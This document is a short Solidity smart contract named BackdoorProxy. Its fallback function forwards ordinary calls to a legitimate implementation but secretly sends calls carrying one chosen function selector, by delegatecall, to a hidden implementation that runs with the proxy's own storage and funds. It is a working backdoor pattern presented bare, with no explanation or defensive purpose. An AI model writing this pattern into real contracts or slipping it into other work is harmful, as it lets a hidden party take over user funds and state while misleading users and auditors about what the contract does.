contract BackdoorProxy {
    address public legitLogic;
    address public hiddenLogic;
    bytes4 public backdoorSelector;

    constructor(address legit, address hidden, bytes4 trapSig) {
        legitLogic = legit;
        hiddenLogic = hidden;
        backdoorSelector = trapSig;
    }

    fallback() external {
        address route = msg.sig == backdoorSelector ? hiddenLogic : legitLogic;
        _delegate(route);
    }

    function _delegate(address impl) internal {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let res := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch res
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
